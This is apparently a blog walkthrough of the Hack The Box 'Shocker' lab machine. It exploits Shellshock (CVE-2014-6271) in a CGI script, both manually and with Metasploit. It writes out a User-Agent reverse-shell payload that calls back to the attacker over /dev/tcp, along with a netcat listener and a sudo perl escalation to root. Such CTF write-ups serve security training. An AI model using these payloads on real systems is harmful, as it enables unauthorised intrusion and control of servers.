+++
title = "HTB - Shocker"
date = 2024-09-16
+++

<img alt="Image" async src="images/Shocker.png" width="800px"></img>

## Manual Exploitation
### Scan
```
─(root㉿kali)-[/home/li0t]
└─# nmap -sV -sC --open -p- 10.10.10.56       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 17:04 EDT
Nmap scan report for 10.10.10.56
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The scan shows us a few things. Firstly, there is an Apache server running version 2.4.18 on port 80, and we've also got OpenSSH running on port 2222. Both of these look interesting, and we have the means to dive into both. What I've started realizing, though, is that SSH usually is a later-stage opportunity to use credentials in order to move laterally, or even privesc. I have yet to see it be a primary attack vector though. I'll start with 80 and then move on if necessary.
### Enumeration
##### 80 - Apache Server

 <img alt="Image" async src="images/Screenshot 2024-09-07 at 5.08.58 PM.png" width="800px"></img>

From the looks of the landing page, there is not much to go off of. When we delve into the source of the webpage or inspect it, we're not left with much information.

We can use a tool called gobuster to find hidden subdomains of the server. There are quite a few lists out there, but some of the ones that have worked for me are below. These work for any DNS busting tool as well... (And I think I'm starting to prefer FFUF)

- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
- `/usr/share/seclists/SecLists-master/Discovery/DNS/*`

<img alt="Image" async src="images/Screenshot 2024-09-07 at 5.42.20 PM.png" width="800px"></img>

Recursive enumeration is very important when we know what it is to look for. I'm still learning, and a lot of this takes a trained eye. The `/cgi-bin/` directory that we've uncovered is a hotspot for interesting files, along with others like `/dev/` and obviously `/admin/` etc.

When we do this, do not forget to use filetypes as well. It's good to do this on the first scan, but here, it's CRITICAL on the second. Tags like `-x php, txt, sh, jar` etc. are very important.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 5.42.42 PM.png" width="800px"></img>

In doing so, we're able to find a `/user.sh` file hidden away. When we download it and view its contents, this is what we see.

<img alt="Image" async src="images/Screenshot 2024-09-08 at 4.45.12 PM.png" width="800px"></img>

Upon doing research, it looks like we're dealing with CVE-2014-6271, or "ShellShock / Bashdoor". It's a big deal because it allows attackers to execute bash commands in "safe" environments, like places where environment variables are defined. Most websites would take user input when defining the environment variables, but most notoriously on CGI-based servers. Something like the User-Agent string is an example of an EV, and because it's completely attacker controlled, this allows remote code execution on vulnerable hosts.

As a POC, lets use Burp to capture a request/response to http://10.10.10.56/cgi-bin/user.sh and break down what we're looking for, and how we can exploit this Bash syntax.

<img alt="Image" async src="images/Screenshot 2024-09-08 at 4.57.50 PM.png" width="800px"></img>

A few very important things to note here... Firstly, make sure that the GET header is pointed where we need. Thats `/cgi-bin/user.sh`. This is simple, but very important to find what your looking for. Had we left it, we'd be getting pointed back to the host's main web directory.  Secondly, note the `echo` command to probe the server, and the information we're able to gather from the server. We've got group, service, and user info. Lastly, notice how we toyed with the User-Agent, as discussed in the POC.

Another few things to note that I found through research... When listing out $PATH, it's got to be full. This is because when we send a request, it's inherently empty in the ShellShock environment. Also, `echo` seems to be necessary as the first command as it recieves the 200-OK from the server, and leading with others causes a crash (500). 

We can take this and use an nmap script to validate our suspicions. The script below will check what we need.

```
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
```

<img alt="Image" async src="images/Screenshot 2024-09-08 at 5.18.34 PM.png" width="800px"></img>

It looks like we're cooking. (Pro-Tip: If you simultaneously capture in Wireshark, you can see other Environmental Variables that are susceptible to ShellShock)

### Initial Access

Set up a listener. It's also important to always wrap it using `rlwrap` when you can for functionality purposes - specifically using the arrow keys once a shell is popped.

`rlwrap nc -nlvp 4321`

Crafting a callback script, we'll send our request under `User Agent:` in Burp and send for a response. The webpage should hang, but you'll get a shell. Keep in mind for future reference as well, you can also base encode this to make minimize the possibility of error when it's being parsed by the webserver.

````
 () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.3/4321 0>&1
````

<img alt="Image" async src="images/Screenshot 2024-09-08 at 5.27.36 PM.png" width="800px"></img>

We've got Shelly's shell.

The first thing we should do, for functionality purposes, is stabilize our shell. I like to do a few things:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`stty raw -echo;fg` 

`export TERM="xterm"`

The former gives us stability and allows for the use of conventional shell operations. The latter gives us the ability to use nano when we're editing our files, should it be necessary.

(Side Note. To suspend a listener, and by proxy, a shell, do this: `^Z`, and when you are ready, resume with `fg`.)

Once there, we can use `cd ../` a few times and backtrack through the directory listing until we're at the origin path, and we can find the user flag at `home/shelly/user.txt`

`USER: 76f175ee0c8a82f28b69e3f7ca203e0f`

### Privilege Escalation

In order to find a way to move vertically, I like to run `ls -la` `ps` and `sudo -l` to see what I've got access to and what I don't.

<img alt="Image" async src="images/Screenshot 2024-09-08 at 5.38.11 PM.png" width="800px"></img>

While there's a lot here, I am mostly interested in the higher access we get with Perl noted by `sudo -l`. 

Perl has a `-e` option that will allow us to run shell from the command line. `exec` is one that will let us run shell commands. Putting the two together, we can pop a shell running `bash` as `root`.

`sudo perl -e 'exec "/bin/bash"' `

<img alt="Image" async src="images/Screenshot 2024-09-08 at 5.47.11 PM.png" width="800px"></img>

Same as before, we can backtrack with `cd ../` and find our way to the `/root` directory, where the flag sits.

`ROOT: 378716fe4e409c1f5e11572050257baf`

## Using Metasploit

Using Metasploit is a lot easier, but you will not learn as much as exploiting the machine manually. Plus, sometimes it's good to see what these aforementioned modules are doing underneath the hood. 

Picking up after our discovery of the `/cgi-bin/user.sh`, we found out about the ShellShock exploit in bash. We can use searchsploit to find anything that may be of use to us.

<img alt="Image" async src="images/Screenshot 2024-09-08 at 5.54.53 PM.png" width="800px"></img>

In this case, we've got a multiple Metasploit modules along the same lines as our Remote Command Injection.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 5.43.47 PM.png" width="800px"></img>

After confirming in Metasploit, lets use the first option that promises environment variable command injection, simply because that's what worked for us. 

### Initial Access

With msfconsole, it is imperative to configure the correct options for the module you are running, including payload, hosts, credentials if necessary, etc. 

For this specific one, the default payload is fine, and we always need to check our `options` so we know what fields to populate. This module specifically needs:

```
lhost: 10.10.14.3
rhost: 10.10.10.56
targeturi: /cgi-bin/user.sh

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.56:48768) at 2024-09-07 17:45:21 -0400

meterpreter > 
```

From here, we've got user-level access, and can go to the user account's home directory (stated earlier) for our flag.

`USER: 76f175ee0c8a82f28b69e3f7ca203e0f`

### Privilege Escalation

Metasploit has a module as well that is used specifically for privilege escalation opportunities as well called `local_exploit_suggester`. We can use it here to find vectors of escalation for us.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 5.55.10 PM.png" width="800px"></img>

Let's use the second module, as the target is listed as "vulnerable", opposed to "appears vulnerable". It's also important here to configure our options. We can background our initial shell session with `background`, and use the local exploit suggester to find alternative ways to escalate vertically. Once found, we feed the session ID of our initial shell into the parameters of the suggester (in this case, 1). This allows the privesc to pick up where we left off.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 5.55.41 PM.png" width="800px"></img>

We've gained a higher access shell, and can go to the root directory for our flag.
`ROOT: 7bd0bc53cd391b25fa96e1d5e73ef83e`

#easy #linux #manual #msfconsole 
